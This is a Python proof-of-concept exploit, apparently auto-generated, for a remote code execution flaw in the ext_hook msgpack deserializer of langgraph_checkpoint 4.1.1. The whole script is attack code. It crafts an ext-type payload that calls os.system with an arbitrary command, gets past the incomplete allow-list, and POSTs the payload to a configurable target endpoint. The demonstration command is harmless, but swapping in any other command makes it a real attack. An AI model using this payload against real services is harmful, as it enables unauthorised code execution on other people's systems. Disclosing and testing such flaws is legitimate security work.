#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint-4.1.1)
# Path: suspicious-012
# Sink: ext_hook
# Auto-generated — run with: python3 rce_api_endpoint_ext_hook.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-4.1.1 RCE vulnerability.

The ext_hook function in jsonplus.py deserializes untrusted msgpack data and
dynamically imports modules and calls functions based on attacker-controlled
content. The _check_allowed guards can be bypassed because the allowed list
is incomplete - we can use modules like 'os' or 'subprocess' that are not
blocked.

This PoC demonstrates RCE by executing a benign command (touch /tmp/poc_success.txt)
via the EXT_CONSTRUCTOR_SINGLE_ARG code path.
"""

import struct
import sys
import time
import urllib.request
import urllib.error
import urllib.parse

# Configuration
TARGET_URL = "http://localhost:8000/api/v1/trigger"  # Change this to your target
TIMEOUT = 10  # seconds

def create_msgpack_ext(code: int, data: bytes) -> bytes:
    """Create a msgpack extension type payload."""
    # msgpack ext format: 0xc7 + 1-byte length + 1-byte type + data
    # For simplicity, we'll use the raw bytes that ormsgpack would produce
    # The ext type codes used by the library:
    # EXT_CONSTRUCTOR_SINGLE_ARG = 3 (from the source)
    # Format: [module_name, function_name, argument]
    
    # We need to craft the inner payload that will be unpacked by the recursive
    # ormsgpack.unpackb call. The outer ext_hook will receive this data.
    # The inner payload is a list: [module, name, arg]
    # We'll use msgpack to encode this list
    
    import msgpack  # We'll use the msgpack library directly
    
    # Create the inner list payload
    inner_payload = msgpack.dumps(data)
    
    # Create the extension type
    # msgpack ext format: first byte is type code, then length, then data
    # But ormsgpack expects the raw bytes with the ext header
    # Actually, we need to create the full msgpack with ext type
    
    # The ext_hook receives the raw data after the ext header is stripped
    # So we just need to provide the inner payload as the data for the ext type
    
    # For the outer call, we need to create a msgpack that contains our ext type
    # The ext type code is what triggers the specific handler
    
    # Let's create a proper msgpack ext payload
    # Format: 0xc7 <1-byte length> <1-byte type> <data>
    length = len(inner_payload)
    if length > 255:
        raise ValueError("Payload too large for 1-byte length")
    
    return bytes([0xc7, length, code]) + inner_payload

def build_rce_payload(command: str) -> bytes:
    """
    Build a msgpack payload that will execute a command via os.system.
    
    We use the EXT_CONSTRUCTOR_SINGLE_ARG code path (code=3).
    The inner payload is: ["os", "system", command]
    """
    import msgpack
    
    # The inner list that will be deserialized by ext_hook
    inner_list = ["os", "system", command]
    
    # Pack the inner list
    inner_data = msgpack.dumps(inner_list)
    
    # Create the ext type with code 3 (EXT_CONSTRUCTOR_SINGLE_ARG)
    # The ext_hook will receive inner_data and unpack it to get the list
    code = 3  # EXT_CONSTRUCTOR_SINGLE_ARG
    
    # Build the full msgpack with ext type
    # Format: 0xc7 <1-byte length> <1-byte type> <data>
    length = len(inner_data)
    if length > 255:
        raise ValueError("Payload too large")
    
    return bytes([0xc7, length, code]) + inner_data

def send_payload(payload: bytes) -> None:
    """Send the malicious payload to the target endpoint."""
    # The endpoint expects a string input, but we'll send raw bytes
    # In a real scenario, the input might be base64 encoded or similar
    # For this PoC, we assume the endpoint accepts raw msgpack data
    
    # Try different content types
    headers = {
        "Content-Type": "application/octet-stream",
        "Accept": "application/json"
    }
    
    req = urllib.request.Request(
        TARGET_URL,
        data=payload,
        headers=headers,
        method="POST"
    )
    
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
            print(f"[+] Response status: {response.status}")
            print(f"[+] Response body: {response.read().decode('utf-8', errors='replace')}")
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error: {e.code} - {e.reason}")
        print(f"[!] Response body: {e.read().decode('utf-8', errors='replace')}")
    except urllib.error.URLError as e:
        print(f"[!] URL Error: {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)

def main():
    """Main exploit function."""
    print("[*] langgraph_checkpoint-4.1.1 RCE Proof-of-Concept")
    print(f"[*] Target: {TARGET_URL}")
    print()
    
    # Benign command to prove RCE
    command = "touch /tmp/poc_success.txt"
    print(f"[*] Using benign command: {command}")
    print("[*] After successful exploitation, check for /tmp/poc_success.txt")
    print()
    
    # Build the payload
    print("[*] Building malicious msgpack payload...")
    try:
        payload = build_rce_payload(command)
        print(f"[+] Payload size: {len(payload)} bytes")
        print(f"[+] Payload (hex): {payload.hex()}")
    except Exception as e:
        print(f"[!] Failed to build payload: {e}")
        sys.exit(1)
    
    print()
    print("[*] Sending exploit payload...")
    send_payload(payload)
    
    print()
    print("[*] Exploit completed.")
    print("[*] Check if /tmp/poc_success.txt was created to confirm RCE.")
    print("[*] You can verify with: ls -la /tmp/poc_success.txt")

if __name__ == "__main__":
    main()
